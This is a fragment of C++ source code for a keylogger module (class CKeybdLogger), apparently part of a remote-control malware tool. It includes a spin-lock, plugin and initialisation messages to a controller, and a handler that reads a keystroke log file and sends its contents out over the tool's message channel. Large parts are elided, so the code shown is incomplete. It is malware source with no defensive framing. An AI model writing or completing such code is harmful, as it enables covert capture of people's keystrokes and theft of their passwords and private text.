...
CKeybdLogger::CKeybdLogger(CManager*pMsgHandler):
CMsgHandler(pMsgHandler, KBLG)
{
	
}

void CKeybdLogger::Lock(){
	printf("Enter CKeybdLogger::Lock()\n");
	while(InterlockedExchange(&mutex,1)){
		Sleep(100);
	}
	printf("Leave CKeybdLogger::Lock()\n");
}
void CKeybdLogger::Unlock(){
	printf("Enter CKeybdLogger::Unlock()\n");
	InterlockedExchange(&mutex,0);
	printf("Leave CKeybdLogger::Unlock()\n");
}
...
void CKeybdLogger::GetPlugs(){
	printf("Not Found Plugs ,call CKeybdLogger::GetPlugs()\n");
	SendMsg(KEYBD_LOG_GETPLUGS,0,0);
}
...
void CKeybdLogger::OnOpen()
{
	...
	//Send init info
	SendMsg(KEYBD_LOG_INITINFO,(char*)&bOfflineRecord,1);
Error:	
	Unlock();
}
...
void CKeybdLogger::OnReadMsg(WORD Msg, DWORD dwSize, char*Buffer)
{
	switch (Msg)
	{
	...
	if (p >= logFileName){
		...
		*p = '\0';
		...
		if (hLog != INVALID_HANDLE_VALUE){
			...
			char*buffer = new char[dwLeft + 1];
			buffer[dwLeft] = NULL;

			if (ReadFile(hLog, buffer, dwLeft, &dwRead, 0)){
				buffer[dwLeft] = 0;
				SendMsg(dwMsg, buffer, dwLeft + 1);	
				dwSendSize += dwLeft;
			}
			delete[]buffer;
			CloseHandle(hLog);
